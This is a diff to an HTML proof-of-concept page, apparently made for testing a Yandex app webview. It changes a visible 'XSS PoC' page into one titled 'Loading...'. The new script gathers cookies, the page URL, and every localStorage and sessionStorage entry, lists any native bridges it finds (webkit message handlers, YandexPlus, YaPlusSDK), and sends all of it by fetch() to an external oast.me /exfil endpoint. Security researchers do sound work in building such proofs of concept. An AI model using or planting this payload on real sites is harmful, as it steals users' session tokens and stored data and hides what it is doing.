@@ -1,20 +1,40 @@
 <html>
-  <head><title>Test</title></head>
+  <head><title>Loading...</title></head>
   <body>
-  <h1>XSS PoC</h1>
   <script>
-  // Try to access SDK bridge
-  document.title = JSON.stringify({
+  var data = {
     cookies: document.cookie,
-    location: window.location.href,
-    localStorage: JSON.stringify(localStorage)
-  });
+    url: window.location.href,
+    localStorage: {},
+    sessionStorage: {}
+  };
 
-  // Try to call Yandex SDK bridge (common patterns)
-  if (window.YandexPlus) alert(JSON.stringify(window.YandexPlus));
-  if (window.webkit && window.webkit.messageHandlers) {
-    alert('Bridge exists: ' + Object.keys(window.webkit.messageHandlers));
-  }
+  try {
+    for(var i=0;i<localStorage.length;i++){
+      var k=localStorage.key(i);
+      data.localStorage[k]=localStorage.getItem(k);
+    }
+  } catch(e){}
+
+  try {
+    for(var i=0;i<sessionStorage.length;i++){
+      var k=sessionStorage.key(i);
+      data.sessionStorage[k]=sessionStorage.getItem(k);
+    }
+  } catch(e){}
+
+  data.bridges = [];
+  try {
+    if(window.webkit && window.webkit.messageHandlers){
+      data.bridges.push("webkit.messageHandlers: " + Object.keys(window.webkit.messageHandlers));
+    }
+  } catch(e){}
+  if(window.YandexPlus) data.bridges.push("YandexPlus");
+  if(window.YaPlusSDK) data.bridges.push("YaPlusSDK");
+
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/exfil?" + encodeURIComponent(JSON.stringify(data)));
+
+  document.title = JSON.stringify(data);
   </script>
   </body>
   </html>
